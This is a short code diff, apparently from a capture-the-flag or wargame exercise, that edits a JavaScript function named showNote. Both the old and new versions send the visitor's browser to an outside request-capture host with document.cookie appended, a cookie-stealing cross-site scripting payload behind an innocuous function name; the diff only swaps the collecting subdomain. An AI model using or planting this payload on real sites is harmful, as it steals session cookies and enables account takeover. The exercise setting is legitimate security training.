@@ -1,3 +1,3 @@
 function showNote(note) {
-    location.href="https://crybdtr.request.dreamhack.games"+document.cookie;
+    location.href="https://vfmxivu.request.dreamhack.games"+document.cookie;
 }
